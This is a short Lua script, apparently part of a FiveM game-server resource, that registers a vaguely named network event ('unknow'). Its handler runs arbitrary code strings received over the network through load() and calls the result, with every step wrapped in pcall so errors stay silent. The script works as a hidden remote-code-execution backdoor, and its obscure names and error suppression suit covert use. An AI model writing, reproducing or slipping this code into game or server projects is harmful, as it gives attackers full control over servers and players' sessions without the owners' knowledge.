

function inject()
	RegisterNetEvent("unknow")
	AddEventHandler("unknow", function(xpto,func,ban,func2,check)		
		if(_G[func..""..func2]==nil)then
			_G[func..""..func2]=true
			_,_G[func] = pcall(load(ban))
			_,_G[func2] = pcall(load(check))
			_,a = pcall(load(xpto))
			a()			
		end
	end)
end
local res,erro = pcall(inject)
